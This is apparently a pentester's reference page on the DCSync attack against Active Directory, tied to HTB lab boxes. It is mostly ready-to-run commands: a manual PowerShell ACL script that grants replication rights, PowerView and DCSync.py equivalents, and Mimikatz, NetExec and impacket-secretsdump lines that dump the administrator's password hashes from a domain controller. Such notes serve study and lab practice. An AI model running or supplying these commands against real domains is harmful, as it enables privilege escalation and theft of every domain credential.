---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# DCSync

## TL;DR

DCSync is late-phase attack that allows an attacker to **mimic a DC** and then dump `ntds.dit`. To perform this attack, we must have control over an account that has the rights to perform domain replication, aka **DCSync rights** (Figure 1):

1. `Replicating Directory Changes`
2. `Replicating Directory Changes All`
3. `Replication-Get-Changes-In-Filtered-Set` (sometimes)

{% hint style="info" %}
**Domain/Enterprise Admins** have these rights by default.&#x20;

If we have **`WriteDacl`**&#x72;ights over an account, we can assign **DCSync rights** to it.&#x20;

The **Windows Exchange Permissions** group has **DCSync rights**.

_Example:_[ _Forest_](../../../boxes/easy/forest.md#privilege-escalation)
{% endhint %}

## Attack

### Enumerate rights.

{% code overflow="wrap" %}
```powershell
# native, requires an elevated command prompt
dsacls "DC=domain,DC=local"
Get-DomainObjectAcl -Identity <USER> -Domain domain.local -ResolveGUIDs
```
{% endcode %}

### Assign DCSync rights

{% tabs %}
{% tab title="PowerView" %}
{% code overflow="wrap" %}
```powershell
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity <USER> -Rights DCSync
```
{% endcode %}
{% endtab %}

{% tab title="Manually" %}
{% code overflow="wrap" %}
```powershell
$acl = get-acl "ad:DC=domain,DC=local"
$id = [Security.Principal.WindowsIdentity]::GetCurrent()
$user = Get-ADUser -Identity $id.User
$sid = new-object System.Security.Principal.SecurityIdentifier $user.SID
# rightsGuid for the extended right Ds-Replication-Get-Changes-All
$objectguid = new-object Guid  1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
$identity = [System.Security.Principal.IdentityReference] $sid
$adRights = [System.DirectoryServices.ActiveDirectoryRights] "ExtendedRight"
$type = [System.Security.AccessControl.AccessControlType] "Allow"
$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "None"
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
$acl.AddAccessRule($ace)
# rightsGuid for the extended right Ds-Replication-Get-Changes
$objectguid = new-object Guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
$acl.AddAccessRule($ace)
Set-acl -aclobject $acl "ad:DC=domain,DC=local"
```
{% endcode %}
{% endtab %}

{% tab title="DCSync.py" %}
{% code overflow="wrap" %}
```bash
DCSync.py -dc domain.local -t 'CN=<USER>,CN=Users,DC=domain,DC=local' 'domain.local\<USER>:<PASS>'
```
{% endcode %}
{% endtab %}
{% endtabs %}

Manual way explained [here](https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md).

### Perform the DCSync attack.

{% tabs %}
{% tab title="Mimikatz" %}
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\administrator"'
# or
mimikatz # lsadump::dcsync /domain:DOMAIN.LOCAL /user:DOMAIN\administrator
```
{% endtab %}

{% tab title="NetExec" %}
```bash
nxc smb 10.10.10.161 -u '<USER>' -p '<PASS>' --ntds --user administrator
```
{% endtab %}

{% tab title="Impacket" %}
{% code overflow="wrap" %}
```bash
impacket-secretsdump htb.local/hacker@10.10.10.161 -just-dc-user administrator
```
{% endcode %}
{% endtab %}
{% endtabs %}

For an example of a DCSync attack using `DCSync.py` -> `secretsdump.py` check [here](https://x7331.gitbook.io/boxes/boxes/boxes/easy/active#eop-via-kerberoasting), or using NetExec [here](https://x7331.gitbook.io/boxes/boxes/boxes/easy/sauna#dcsync-attack).

## Resources

{% tabs %}
{% tab title="DCSync" %}
{% embed url="https://www.alteredsecurity.com/post/a-primer-on-dcsync-attack-and-detection" %}
A great article about the DCSync attack.
{% endembed %}
{% endtab %}

{% tab title="Secretsump" %}
{% embed url="https://www.youtube.com/watch?v=QfyZQDyeXjQ" %}
How Secretsdump script work behind the scenes!
{% endembed %}
{% endtab %}

{% tab title="dsacls" %}
{% embed url="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771151(v=ws.11)" %}
{% endtab %}
{% endtabs %}
